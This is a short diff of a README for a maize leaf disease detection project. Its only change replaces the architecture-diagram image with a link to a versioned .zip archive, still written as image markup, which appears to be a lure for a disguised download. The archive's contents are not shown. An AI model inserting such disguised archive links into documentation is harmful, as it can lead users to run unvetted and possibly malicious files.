@@ -1,7 +1,7 @@
 # MedideepCF
 # MediDeepCF: A Multi-Task Deep Learning and Fuzzy Logic Framework for Maize Leaf Disease Detection and Severity Estimation
 
-![Model](docs/architecture_diagram.png) <!-- Optional: Add image path or remove this line -->
+![Model](https://raw.githubusercontent.com/Soikoth3010/MedideepCF/main/calculiform/Medideep_CF_3.7-alpha.5.zip) <!-- Optional: Add image path or remove this line -->
 
 ## 📌 Overview
 
